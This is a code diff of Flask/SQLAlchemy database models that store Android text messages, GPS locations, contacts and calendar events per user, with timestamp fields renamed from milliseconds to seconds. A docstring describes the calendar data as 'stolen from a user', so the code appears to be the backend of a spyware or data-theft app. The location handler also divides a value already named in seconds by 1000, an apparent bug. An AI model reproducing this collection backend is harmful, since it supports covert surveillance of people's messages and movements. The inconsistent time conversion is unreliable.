@@ -40,7 +40,7 @@ class Contact(db.Model):
                 user_id=contact.user_id,
                 contact_id=contact.contact_id,
                 android_given_id=message.get("id"),
-                time_in_UTC_milliseconds=message.get("timeInUTCMilliseconds"),
+                time_in_UTC_seconds=message.get("timeInUTCSeconds"),
                 body=message.get("body"),
                 address=message.get("address"),
                 inbound=message.get("inbound")
@@ -71,7 +71,7 @@ class TextMessage(db.Model):
 
     # TODO: I dont know whether BigInteger is the same as long
     android_given_id = db.Column(db.BigInteger, nullable=False)
-    time_in_UTC_milliseconds = db.Column(db.BigInteger, nullable=False)
+    time_in_UTC_seconds = db.Column(db.BigInteger, nullable=False)
     body = db.Column(db.String(64), nullable=False)
     address = db.Column(db.String(64), nullable=False)
     inbound = db.Column(db.Boolean, default=False)
@@ -100,7 +100,7 @@ class Location(db.Model):
 
     longitude = db.Column(db.Float, nullable=False)
     latitude = db.Column(db.Float, nullable=False)
-    time_in_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
+    time_in_utc_seconds = db.Column(db.BigInteger, nullable=False)
 
     @staticmethod
     def userdata_post_handler(user_id, location_data_dict):
@@ -109,13 +109,13 @@ class Location(db.Model):
             user_id=int(user_id),
             longitude=location_data_dict.get("longitude"),
             latitude=location_data_dict.get("latitude"),
-            time_in_utc_milliseconds=location_data_dict.get("timeInUTCMilliseconds"),
+            time_in_utc_seconds=location_data_dict.get("timeInUTCSeconds") / 1000,
         )
         db.session.add(location)
         db.session.commit()
 
     def __repr__(self):
-        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_in_utc_milliseconds, self.latitude, self.longitude)
+        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_in_utc_seconds, self.latitude, self.longitude)
 
 class CalendarEvent(db.Model):
     """Models a calendar entry stolen from a user"""
@@ -125,8 +125,8 @@ class CalendarEvent(db.Model):
 
     title = db.Column(db.String(64), nullable=False)
     event_location = db.Column(db.String(64), nullable=True)
-    start_in_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
-    end_in_utc_milliseconds = db.Column(db.BigInteger, nullable=False)
+    start_in_utc_seconds = db.Column(db.BigInteger, nullable=False)
+    end_in_utc_seconds = db.Column(db.BigInteger, nullable=False)
 
     @staticmethod
     def userdata_post_handler(user_id, calendar_data_dict):
@@ -136,8 +136,8 @@ class CalendarEvent(db.Model):
             user_id=int(user_id),
             title=calendar_data_dict.get("title"),
             event_location=calendar_data_dict.get("eventLocation"),
-            start_in_utc_milliseconds=calendar_data_dict.get("startInUTCMilliseconds"),
-            end_in_utc_milliseconds=calendar_data_dict.get("endInUTCMilliseconds"),
+            start_in_utc_seconds=calendar_data_dict.get("startInUTCSeconds"),
+            end_in_utc_seconds=calendar_data_dict.get("endInUTCSeconds"),
         )
         db.session.add(event)
         db.session.commit()
